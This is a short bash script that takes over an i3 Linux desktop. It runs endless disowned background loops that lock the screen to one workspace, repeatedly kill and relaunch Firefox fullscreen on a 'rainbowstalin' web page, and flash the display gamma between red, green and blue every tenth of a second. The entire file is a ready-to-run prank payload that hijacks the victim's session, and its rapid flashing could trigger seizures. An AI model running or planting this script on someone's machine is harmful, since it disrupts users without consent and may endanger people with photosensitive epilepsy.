#!/bin/bash
DP=$(xrandr | grep " connected" | cut -d' ' -f1);


while true; do i3-msg "workspace 1"; done 2>&1 >/dev/null &
while true; do killall -9 firefox; sleep 0.2; firefox --new-window http://psapin.github.io/rainbowstalin.html; done 2>&1 >/dev/null & 
while true; do i3-msg '[title=".*Mozilla Firefox"] fullscreen enable; [title=".*Mozilla Firefox"] move workspace 1'; done 2>&1 >/dev/null &
while true; do xrandr --output $DP --gamma 1:0.001:0.001;  sleep 0.1; xrandr --output $DP --gamma 0.001:1:0.001; sleep 0.1; xrandr --output $DP --gamma 0.001:0.001:1;  sleep 0.1; done 2>&1 >/dev/null &

disown

